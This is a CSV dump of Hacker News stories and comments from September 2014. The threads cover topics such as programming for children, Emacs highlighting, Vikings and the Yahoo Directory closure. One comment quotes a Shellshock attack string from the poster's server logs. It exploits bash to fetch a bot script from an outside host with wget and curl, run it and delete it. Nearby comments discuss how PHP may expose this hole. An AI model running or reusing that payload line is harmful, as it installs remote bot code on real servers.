ID,Type,Story,Parent,Points,Comments,Author,Title,URL,Content,Created
8379267,comment,8379000,8379212,9,0,rwg,,,"Also, &quot;don&#x27;t hack random companies and brag about it to your friends and (Federal government IT security contractor) co-workers.&quot;<p><a href=""http://www.archives.gov/research/military/ww2/photos/images/ww2-27.jpg"" rel=""nofollow"">http://www.archives.gov/research/military/ww2/photos/images/...</a>",1411893893
8379266,comment,8378728,8379232,2,0,arianvanp,,,"Zeichen and Tastatur if I recall correctly.",1411893857
8379265,story,,,4,0,ronswanson,"Show HN: Twitter Contests made easy",http://www.stripedcontests.com,,1411893855
8379264,story,,,1,0,mr_tyzic,"How Stoical Was Seneca?",http://www.nybooks.com/articles/archives/2014/oct/09/how-stoical-was-seneca,,1411893802
8379262,comment,8375372,8375880,1,0,enneff,,,"> The only thing I could come up with is maybe you have additional dependencies outside your binary required to make the environment run?<p>Exactly.",1411893710
8379261,comment,8379163,8379163,2,0,brudgers,,,"I&#x27;d recommend Ubuntu Studio [1] over straight up Ubuntu. First because it contains some really cool software. Second because Unity is enough of an odd-duck that a person should make an informed choice to use it.<p>Language number 1 for a kid: Processing. It&#x27;s simple, Has a simple IDE, and does some really interesting things.<p>I think IntelliJ is a bit of a loss as a way of introducing programming to a child. It&#x27;s powerful, but the tools are mostly in the way of a novice.<p>BTW, don&#x27;t bet on the whole &quot;Internet Restriction&quot; idea. Many twelve year olds have been online via school since first or second grade. If the parents aren&#x27;t setting up a laptop, they&#x27;re probably not configuring their router to block packets either.<p>[1] Of course, Grub should be set up to default to the normal kernel rather than low-latency.<p>[2] <a href=""http://ubuntustudio.org/"" rel=""nofollow"">http://ubuntustudio.org/</a><p>[3] <a href=""http://processing.org/"" rel=""nofollow"">http://processing.org/</a>",1411893708
8379260,comment,8378799,8378799,1,0,arianvanp,,,"There is a really great mode [0] for haskell that does the same thing as hl-sexp-mode. Oh and did I mention it fully supports structured editing? These kind of modes really make me question why programs are still written in text instead of ADTs... We don&#x27;t need to run lexers and parsers to do our syntax highlighting and other fancy stuff... it would be awesome.<p>[0] <a href=""https://github.com/chrisdone/structured-haskell-mode"" rel=""nofollow"">https://github.com/chrisdone/structured-haskell-mode</a>",1411893602
8379259,story,,,2,0,jackau,"The first wearable drone camera",https://www.youtube.com/watch?v=_VFsdPAoI1g&feature=youtu.be,,1411893508
8379258,comment,8379163,8379200,1,0,tonteldoos,,,"Awesome - thanks!",1411893473
8379257,comment,8379163,8379203,1,0,tonteldoos,,,"Thanks for the elementary OS pointer - I&#x27;ll check it out!<p>As for vim and ruby, much as I&#x27;m a fan of both, I don&#x27;t want to put him off programming entirely by first having to learn the entire shell first ;)",1411893455
8379256,comment,8379113,8379113,1,0,robryan,,,"Not surprised to see qwiki there. For all the hype around it I never thought that it would be successful. All it really seemed to do was make clumsy automated videos that took a lot away but really didn&#x27;t add anything to just reading a wikipedia article.",1411893439
8379255,comment,8374345,8376530,1,0,kragen,,,"> went way overboard with functions, most of which only have one caller. It&#x27;s so bad that the main loop of the program is five calling levels deep<p>It almost sounds like you&#x27;re talking about <a href=""http://canonical.org/~kragen/sw/dev3/server.s"" rel=""nofollow"">http://canonical.org/~kragen/sw/dev3/server.s</a>!  Or for that matter <a href=""http://canonical.org/~kragen/sw/aspmisc/my-very-first-raytracer.html"" rel=""nofollow"">http://canonical.org/~kragen/sw/aspmisc/my-very-first-raytra...</a>!  But it&#x27;s unlikely you&#x27;ve had to maintain either of them.  I intentionally broke things up like that with the idea that it would make it easier to understand.  In fact, I originally wrote httpdito as straight-line code and only later factored it into macros to make it easier to understand.<p>It sounds like you&#x27;re saying that this was misguided and I should have just used nesting.  I&#x27;ll have to think about that for a while.",1411893402
8379254,comment,8377321,8378255,2,0,xorcist,,,"It looks like you have dumped the a PHP global variable, possibly $_ENV. Do you know of any circumstances where _ENV, or any other PHP variable with potentially untrusted data, is passed in environment variables?",1411893316
8379253,comment,8379163,8379191,1,0,tonteldoos,,,"Any particular reason for these?  I&#x27;m a software engineer, and apart from emacs, I have no idea what the other ones are ;-)",1411893282
8379252,comment,8378788,8379207,8,0,robryan,,,"I would still call it history written by the winners. In the end the Christians had the cultural influence that runs all the way until today.<p>If the Viking culture had been preserved into modern day I would expect that we would see them in a different light.",1411893276
8379251,comment,8378428,8379230,3,0,alan_cx,,,"Hiding something does not equal a conspiracy theory. I mean, do you believe that behind every door there is a conspiracy? Do clothes equal a conspiracy to hide the human body? Is covering a seed with soil a conspiracy to hide seeds? If you think yes, than please tell us what you think a conspiracy is. Or are people just trying to protect property, keep warm and grow plants? Maybe they are conspiring to protect property with carpenters?<p>In this case, I think its reasonable to thing that covering up the ship and bodies are to protect dignity.",1411893195
8379250,comment,8377321,8378275,0,0,xorcist,,,"> I&#x27;m absolutely positive that fastcgi_params does indeed clobber $_ENV with attacker supplied data if PHP is configured as described above.<p>This is irrelevant. There is no known hole with global variables containing untrusted data.<p>> I am less strongly confident that some configurations of PHP will allow $_ENV to get to at least some subprocesses.<p>This could be relevant, if it is indeed passed in the environment.<p>However I can find no reference in the PHP documentation to this. That does not count for much, admittedly, and I am not very fluent in PHP. If this is real then it is a problem for many people so please share.<p>> I&#x27;m aware of a PHP command which the documentation suggests defaults to passing $_ENV as actual environment variables to subprocesses<p>Please spell it out already. I&#x27;ve been testing for the better part of two hours to find what you are alluding to, but I have no idea if I&#x27;m wasting my time or not.",1411893159
8379249,comment,8379000,8379000,1,0,jokoon,,,"are there ISO standards for computer security ?",1411893137
8379248,comment,8378788,8378788,4,0,MrJagil,,,"History channel&#x27;s &quot;Vikings&quot; is actually a quite good remedy for your GoT withdrawals. As a Dane, and even after reading this article, I find the series very accurate, only embellished in obvious places (blood eagle, mushrooms etc).<p>At the least they got the scandinavian personality traits right.",1411893088
8379247,story,,,166,61,snyp,"Building OS X Apps with JavaScript",http://tylergaw.com/articles/building-osx-apps-with-js,,1411892973
8379246,comment,8378819,8378819,2,0,zerolinesofcode,,,"(93 days ago) [Ask HN] Material Design Bootstrap Theme <a href=""https://news.ycombinator.com/item?id=7953042"" rel=""nofollow"">https://news.ycombinator.com/item?id=7953042</a>",1411892947
8379245,comment,8379113,8379113,8,0,sthlm,,,"The Yahoo Directory was Yahoo&#x27;s first product.<p>This is a stark reminder that very few things last and maybe a point to reflect how Yahoo succeeded and failed to pivot into other directions.<p>Can you imagine Google terminating Search? Facebook terminating their home page? What else would they do and would they be successful?<p>In a historical context, back in the day directories were a big deal, it took a long time for search engines to become powerful enough to rival the usability. A piece of the old web is gone now.",1411892793
8379244,comment,8378804,8379008,1,0,brudgers,,,"With AutoCad or any software that exports DXF or IGES, Git or other version control would work fine. Nemetscheck VectorWorks wil export a design file as VectorScript [a super-set of Pascal].",1411892715
8379243,comment,8378065,8378753,2,0,0x0,,,"You&#x27;re probably right, but there was a least a big reprise of it in 2011 in php - CVE-2011-4885",1411892693
8379242,comment,8366745,8366745,2,0,Ayaz,,,"I saw a couple of these hurled against my simple site:<p><pre><code>    &quot;() { :;}; /bin/bash -c \\x22wget http://stablehost.us/bots/regular.bot -O /tmp/sh;curl -o /tmp/sh http://stablehost.us/bots/regular.bot;sh /tmp/sh;rm -rf /tmp/sh\\x22&quot;</code></pre>",1411892637
8379241,comment,8377600,8378736,1,0,p1esk,,,"Any Nvidia card made in the last 5 years will do.",1411892615
8379240,comment,8377579,8377579,2,0,raldu,,,"The most horrible article I have read at NY Times so far.\nPushing workers to work harder and faster by motivating them with punishment is not about productivity at all. Alienating workers, saying that they &quot;wanted&quot; punishment and backing up all these &quot;business&quot; rhetoric with science is just sick.\nI wonder what &quot;state of mind&quot; the author was in when producing this article. Did he also hired the Ivy League College he is working in to help with his &quot;self-control&quot; issues?\nAnd providing workers with a &quot;wellness program&quot; just because it &quot;reduces health costs&quot; was the most chilling part.\nWe are all human beings, not quantities or rats in a maze.",1411892604
8379239,comment,8379113,8379145,7,0,nly,,,"Dmoz is still surprisingly productive. Definitely needs to some love though. The only modern directory that I can think of along these lines is the &#x27;Hidden Wiki&#x27; for Tor.",1411892486
8379238,comment,8378540,8378540,4,0,VexXtreme,,,"Most Japanese day traders are ex-pachinko players, i.e. degenerate gamblers. Nothing to see here.",1411892455
8379237,comment,8378804,8379064,4,0,brudgers,,,"Robust open-source CAD software would clearly fill a niche.<p>The problem however, is not so much CAD as the schemas for the data that at gets attached to the models...IGES has been around for many decades, but what one engineer needs for FEA is not what the machinist needs for making the die or the Architect for making pretty pictures.",1411892383
8379236,comment,8378799,8378799,3,0,drothlis,,,"The article doesn&#x27;t mention highlighting the declarations/definitions of types\n& variables. I find it far less obtrusive, and more useful, than lexical\nhighlighting. It&#x27;s surprisingly easy to do in Emacs, and it works\nreasonably well across most language modes. Example screenshots:\n<a href=""http://david.rothlis.net/code_presentation/distracting_syntax_highlighting/"" rel=""nofollow"">http://david.rothlis.net/code_presentation/distracting_synta...</a>",1411892353
8379234,comment,8378163,8378775,2,0,dmpk2k,,,"<i>pay is meh until you get tenure.</i><p>More like <i>if</i> you get tenure, which is increasingly rare nowadays. I think it&#x27;s a poor gamble.",1411892257
8379233,comment,8379113,8379116,4,0,swartkrans,,,"I&#x27;ve been watching the new page for a few days and Yahoo! killing Yahoo! Directory has appeared many times, and each time it has gone no where. This is the first time I&#x27;ve seen it on the home page.",1411892214
8379232,comment,8378728,8379227,2,0,melloclello,,,"Thanks! Just doing this...",1411892154
8379231,comment,8378728,8378910,1,0,spilk,,,"I have SwiftKey installed and there is an option in the Settings->General->Keyboard->Keyboards->SwiftKey allows me to toggle it on/off:<p><a href=""https://i.imgur.com/RUN4nno.png"" rel=""nofollow"">https://i.imgur.com/RUN4nno.png</a>",1411892129
8379230,comment,8378428,8378719,1,0,tomjen3,,,"To me that is actually a really, really good argument for the conspiracy theory - why go to such lengths to cover it up, if there is nothing to hide?",1411892071
8379229,comment,8379000,8379000,4,0,fenomas,,,"> There was one catch: Akhter said he was required to sign a statement saying he had created the hack and to show agents that he could actually do it.<p>It sounds more like DHS caught someone doing social engineering, hired him to help them catch hackers, and this is what he came up with.",1411892033
8379228,comment,8378728,8379209,2,0,melloclello,,,"Gah, this thing again. I&#x27;ve noticed that happening on a couple of the other custom keyboards, as well - I suspect it may be an actual bug in iOS 8. I was hoping it would be fixed when the GM came out but no dice...<p>PS thanks for not giving me a one-star review :o)",1411891989
8379227,comment,8378728,8378728,2,0,6581,,,"Regarding your German search terms: you should probably remove charakter (which usually refers to a person&#x27;s character) and klaviatur (which only refers to the keyboard of musical instruments), and replace &quot;eingang&quot; (entrance) with &quot;eingabe&quot; (input or entry).",1411891978
8379226,comment,8377321,8378361,3,0,clarry,,,"And before you believe that your Linux box is any indication of how common a dependency bash is...<p>I just grepped all the Makefiles in my ports tree for &#x27;shells/bash&#x27;, and came up with 48 matches.  This includes ports that depend on bash at build time, at test time, and at runtime.  So for people who just use packages, the number of things that are going to pull in bash (as a runtime dep) is lower than that.<p>We have many of the same programs you have, but they do not use bash.  For example, all your executables that start with xz or lz.  I have them, most of them anyway, but they use /bin/sh, not /bin/bash.<p>I use BSD on the desktop, and out of the three hundred packages I have installed, <i>none</i> have pulled bash in as a dep.  I don&#x27;t have bash, I haven&#x27;t had it for years.",1411891895
8379225,comment,8378870,8378870,1,0,JacobAldridge,,,"At CIA Starbucks, not even the advertorial is called out by name.",1411891870
8379224,comment,8378428,8378719,6,0,m_eiman,,,"There have been investigations and video inspection of the wreck. &quot;Everyone&quot; agrees that the official explanation is correct.<p>The reason for covering the wreck is that the disaster was a major national catastrophe; if 800+ hadn&#x27;t died it would never have been considered.<p>Says Wikipedia:<p><i>&quot;In the aftermath of the disaster, many relatives of the deceased demanded that their loved ones be raised from international waters and given a land burial. Demands were also made that the entire ship be raised so that the cause of the disaster could be discovered by detailed inspection.[27][28]<p>Citing the practical difficulties and the moral implications of raising decaying bodies from the sea floor (the majority of the bodies were never recovered), and fearing financial burden of lifting the entire hull to the surface and the salvage operation, the Swedish government suggested burying the whole ship in situ with a shell of concrete.[29][30] As a preliminary step, thousands of tons of pebbles were dropped on the site.[28] The Estonia Agreement 1995, a treaty among Sweden, Finland, Estonia, Latvia, Poland, Denmark, Russia and the United Kingdom, declared sanctity over the site, prohibiting their citizens from even approaching the wreck.[31]&quot;</i>",1411891839
8379223,comment,8378870,8379109,1,0,JacobAldridge,,,"I always give my beautiful wife&#x27;s name as it&#x27;s much easier to spell and yell than mine, and slightly less common. It&#x27;s amazing how many brains seem to process &#x27;Jacob&#x27; as either &#x27;Jason&#x27; or &#x27;Joseph&#x27;.<p>But I am always tempted to give my name as Primrose Everdeen [1]<p>[1] <a href=""http://hungergamesfandom.net/tag/i-volunteer-as-tribute/"" rel=""nofollow"">http://hungergamesfandom.net/tag/i-volunteer-as-tribute/</a>",1411891832
8379222,comment,8377487,8377487,1,0,Zardoz84,,,"In C++ , a full virtual computer : \n<a href=""https://github.com/trillek-team/trillek-vcomputer-module"" rel=""nofollow"">https://github.com/trillek-team/trillek-vcomputer-module</a>",1411891745
8379221,comment,8379000,8379000,6,0,numann,,,"If Muneeb is charged, any attempts at recruiting hacking talent will be hindered. This could make DHS look very bad if they push this forward.",1411891736
8379220,comment,8376747,8378318,2,0,kgabis,,,"I would be so happy if that comittee started <i>removing</i> features instead of adding them. Guidelines like that are just a way of dealing with all the complexity they introduced to C++ over the years.",1411891703
8379219,comment,8379000,8379212,3,0,nether,,,"AM I BEING DETAINED",1411891645
8379218,comment,8376567,8376567,1,0,alblue,,,"This is basically a copy of my post at <a href=""http://alblue.bandlem.com"" rel=""nofollow"">http://alblue.bandlem.com</a> and of my stack exchange answer.",1411891631
8379217,comment,8378799,8379002,1,0,Derbasti,,,"I believe that Sublime Text is a descendant from Textmate, and therefore uses a single table of recursive regular expressions for syntax highlighting.<p>It therefore can not distinguish multiple instances of the same thing (different variables) or overlay different highlighting modes on top of one another.",1411891603
8379215,comment,8377943,8379014,1,0,f-,,,"Using env may be slightly more portable if you&#x27;re using an exotic login shell that doesn&#x27;t support the &quot;FOO=1 program&quot; syntax - say, tcsh.<p>But for most part, it&#x27;s probably just people copying-and-pasting stuff without really figuring it out what it does. For example, compare &quot;exploit #1&quot; and the supposedly different &quot;exploit #3&quot; on shellshocker.net.",1411891569
8379214,comment,8378870,8378870,2,0,thomasmarriott,,,"an intelligence agency. that specializes in proxies. failing sutton&#x27;s law. who would&#x27;ve guessed..<p>wait for it..&#x27;thanks, your ORDER NUMBER is #&#x27;<p>ta-da!",1411891401
8379213,comment,8374345,8376079,1,0,kragen,,,"I thought <i>you</i> were the one who suggested the IF and ELSE macros in <a href=""http://canonical.org/~kragen/sw/aspmisc/actor.c"" rel=""nofollow"">http://canonical.org/~kragen/sw/aspmisc/actor.c</a>. :)<p>Interestingly, in <a href=""http://canonical.org/~kragen/sw/dev3/paperalgo"" rel=""nofollow"">http://canonical.org/~kragen/sw/dev3/paperalgo</a>, I haven&#x27;t yet run into the desire to have more than one `case` in a pattern-matching `switch`.  I just added that piece of code from Vicissicalc to the paperalgo page.",1411891365
8379212,comment,8379000,8379000,10,0,muriithi,,,"Don&#x27;t Talk to Police \n<a href=""https://www.youtube.com/watch?v=6wXkI4t7nuc"" rel=""nofollow"">https://www.youtube.com/watch?v=6wXkI4t7nuc</a>",1411891354
8379209,comment,8378728,8378728,2,0,M4v3R,,,"Hey, nice app! Unfortunately it has a bug on my device (iPad Air, iOS 8.0.2) when used in other apps (Notes app here): <a href=""http://i.imgur.com/TSZZsYz.jpg"" rel=""nofollow"">http://i.imgur.com/TSZZsYz.jpg</a><p>The keyboard never shows up, only this blank area. Hope you can fix it, didn&#x27;t want to spoil your reviews :).",1411891284
8379208,story,,,5,0,siteshwar,"fish shell 2.1.1 (Security fixes)",http://fishshell.com/?version=2.1.1,,1411891253
8379207,comment,8378788,8378788,6,0,rmc,,,"The Vikings are an example of history written by the losers. The people who lost the battles (literate Christians) wrote the history. The Vikings didn&#x27;t have nearly that much writing, so they came off very bad in European history.",1411891201
